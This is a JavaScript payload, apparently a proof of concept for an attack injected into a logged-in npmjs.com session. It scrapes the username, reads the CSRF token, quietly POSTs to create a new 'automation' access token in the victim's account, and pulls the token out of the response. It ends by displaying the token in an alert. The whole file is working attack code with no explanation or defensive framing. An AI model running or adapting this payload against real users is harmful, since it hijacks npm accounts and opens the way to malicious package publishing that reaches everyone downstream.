let username = "";
let a = document.scripts
for (var i = 0; i<a.length; i++){
    var test = a[i].textContent.match(/name":"(\w*)"/)?.[1]
    if (test){
        username = test
    }
}
// Create a FormData object
const formData = new FormData();
formData.append("name", "teste");
formData.append("access", "automation");
formData.append("csrftoken", document.querySelector('input[name=csrftoken]').value);

// Perform the fetch request
fetch(`https://www.npmjs.com/settings/${username}/tokens/new`, {
    method: "POST",
    mode: "cors",
    credentials: "include",
    body: formData,
})
.then(response => response.text())
.then(html => {
    // Parse the HTML response
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    // Select the third <p> inside #token-alert
    const tokenElement = doc.querySelector("#token-alert p:nth-child(3)");
    if (tokenElement) {
        const token = tokenElement.textContent.trim();
        console.log("Generated Token:", token);
        alert("Generated Token: " + token)
        return token; // Use the token as needed
    } else {
        console.error("Token not found in the response.");
    }
})
.catch(error => console.error("Error:", error));
